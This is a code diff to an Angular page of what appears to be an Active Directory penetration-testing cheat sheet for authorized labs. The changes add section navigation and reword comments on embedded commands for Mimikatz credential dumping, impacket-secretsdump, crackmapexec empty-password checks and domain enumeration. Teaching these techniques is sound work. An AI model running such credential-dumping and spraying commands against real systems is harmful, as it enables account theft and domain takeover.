@@ -1,19 +1,53 @@
 
-import { Component } from '@angular/core';
+import { Component, DestroyRef, OnInit, inject } from '@angular/core';
 import { CommonModule } from '@angular/common';
 import { MatExpansionModule } from '@angular/material/expansion';
+import { ActivatedRoute, Router } from '@angular/router';
+import { takeUntilDestroyed } from '@angular/core/rxjs-interop';
 import { Terminal } from '../../shared/terminal/terminal';
+import { SectionIndexComponent, SectionIndexItem } from '../../shared/components/section-index/section-index';
 
 @Component({
   selector: 'app-active-directory',
   standalone: true,
-  imports: [CommonModule, MatExpansionModule, Terminal],
+  imports: [CommonModule, MatExpansionModule, Terminal, SectionIndexComponent],
   templateUrl: './active-directory.html',
   styleUrl: './active-directory.scss',
 })
-export class ActiveDirectory {
+export class ActiveDirectory implements OnInit {
 
-  selectedService: string | null = null;
+  selectedService: string | null = 'full-ad-compromise-linux';
+  readonly sections: SectionIndexItem[] = [
+    { id: 'full-ad-compromise-linux', label: 'Kali Single-Host Flow', group: 'AD Flow' },
+    { id: 'ad-flow', label: 'Windows Pivot Flow', group: 'AD Flow' },
+    { id: 'windows', label: 'Windows Commands', group: 'Enumeration' },
+    { id: 'powerview', label: 'PowerView', group: 'Enumeration' },
+    { id: 'manual', label: 'Manual Enumeration', group: 'Enumeration' },
+    { id: 'spn', label: 'SPN Enumeration', group: 'Enumeration' },
+    { id: 'acl', label: 'Object Permissions', group: 'Enumeration' },
+    { id: 'shares', label: 'Domain Shares', group: 'Enumeration' },
+    { id: 'bloodhound', label: 'BloodHound', group: 'Enumeration' },
+    { id: 'credentials', label: 'Credential Access', group: 'Attacking' },
+    { id: 'kerberos', label: 'Kerberos Attacks', group: 'Attacking' },
+    { id: 'passwords', label: 'Password Attacks', group: 'Attacking' },
+    { id: 'compromise', label: 'Domain Compromise', group: 'Attacking' },
+    { id: 'planned-privesc', label: 'Privilege Escalation', group: 'Coming later', disabled: true },
+    { id: 'planned-post-exploitation', label: 'Post-Exploitation', group: 'Coming later', disabled: true }
+  ];
+  private readonly route = inject(ActivatedRoute);
+  private readonly router = inject(Router);
+  private readonly destroyRef = inject(DestroyRef);
+
+  ngOnInit(): void {
+    this.route.queryParamMap
+      .pipe(takeUntilDestroyed(this.destroyRef))
+      .subscribe(params => {
+        const service = params.get('service');
+        if (service && this.sections.some(item => item.id === service && !item.disabled)) {
+          this.selectedService = service;
+        }
+      });
+  }
 
   // =========================================================
   // NAVIGATION
@@ -21,10 +55,15 @@ export class ActiveDirectory {
 
   selectService(service: string): void {
     this.selectedService = service;
+    void this.router.navigate([], {
+      relativeTo: this.route,
+      queryParams: { service },
+      replaceUrl: true
+    });
   }
 
   clearService(): void {
-    this.selectedService = null;
+    this.selectedService = 'full-ad-compromise-linux';
   }
 
   // =========================================================
@@ -102,16 +141,16 @@ Find-LocalAdminAccess
 `;
 
   manualSessions = `
-# Enumerate sessions on a specific computer
+# Query sessions on a named domain computer such as files04
 Get-NetSession -ComputerName <name> -Verbose
 
-# Example
+# Example: query files04
 Get-NetSession -ComputerName files04 -Verbose
 
-# Enumerate logged-on users using PsLoggedOn
+# List logged-on users with PsLoggedOn
 .\\PsLoggedon.exe \\\\<name>
 
-# Example
+# Example: query files04
 .\\PsLoggedon.exe \\\\files04
 `;
 
@@ -123,7 +162,7 @@ Get-NetSession -ComputerName files04 -Verbose
 # List SPNs registered to a user
 setspn -L <user>
 
-# Example
+# Example: inspect the iis_service account
 setspn -L iis_service
 `;
 
@@ -155,7 +194,7 @@ nslookup.exe <IP>
 # Enumerate permissions on a user object
 Get-ObjectAcl -Identity <user>
 
-# Example
+  # Example: inspect the stephanie user object
 Get-ObjectAcl -Identity stephanie
 
 # Convert a SID to a name
@@ -324,7 +363,7 @@ sekurlsa::ekeys
 `;
 
   attackCachedCredentials = `
-# Inspect cached domain logon credentials
+# In an elevated Mimikatz console, inspect cached domain logons
 lsadump::cache
 
 # DCC2 / MS Cache v2 is not an NTLM hash.
@@ -347,10 +386,10 @@ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 `;
 
   attackLsaSecrets = `
-# Inspect LSA secrets
+# In a Mimikatz console, inspect LSA secrets
 lsadump::secrets
 
-# Inspect local SAM hashes
+# Inspect local SAM hashes in the same console
 lsadump::sam
 
 # LSA secrets may contain service-related or machine-account
@@ -373,7 +412,7 @@ vault::cred
 `;
 
   attackDpapi = `
-# Inspect DPAPI-related material in memory
+# In a Mimikatz console, inspect DPAPI material in memory
 sekurlsa::dpapi
 
 # DPAPI can protect browser data, application secrets
@@ -493,18 +532,16 @@ net accounts
 `;
 
   attackCredentialValidation = `
-# LDAP / ADSI can be used to validate credentials in an
-# authorized lab. Use placeholders; never store real passwords
-# in source code or command history.
+# Resolve the current domain, PDC and base DN for an LDAP test.
+# This snippet does not bind or validate credentials.
 
 $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 $pdc = $domainObj.PdcRoleOwner.Name
 $dn = "DC=" + $domainObj.Name.Replace(".", ",DC=")
 $path = "LDAP://$pdc/$dn"
 
-# Create a DirectoryEntry with lab credentials supplied
-# through a secure input mechanism.
-# Do not hardcode passwords in scripts or website examples.
+# Perform any credential bind separately with authorized lab credentials.
+# Do not hardcode passwords in scripts or command history.
 `;
 
   attackPasswordSpray = `
@@ -809,8 +846,8 @@ nmap -sCV -p PORTS -n -Pn TARGET_IP -oN pivotServices
 
   // Full AD Compromise from Linux
 
-  linuxAdInitialScan = String.raw`# Full TCP port scan
-nmap -p- --min-rate 5000 -T4 <IP>
+  linuxAdInitialScan = String.raw`# Full TCP port scan; save open ports for the follow-up command
+  nmap -p- --min-rate 5000 -T4 <IP> -oN openPorts
 
 # Service and version detection
 nmap -sCV -p <ports> <IP>
@@ -877,7 +914,7 @@ crackmapexec smb <IP> -u user -p '<PASSWORD>' -d corp.com
 # Password policy
 crackmapexec smb <IP> -u user -p '<PASSWORD>' --pass-pol
 
-# Check accounts that require a password change
+# Check whether any listed account accepts an empty password
 nxc smb <IP> -u users.txt -p '' --continue-on-success
 
 # Change an expired or must-change password when authorized
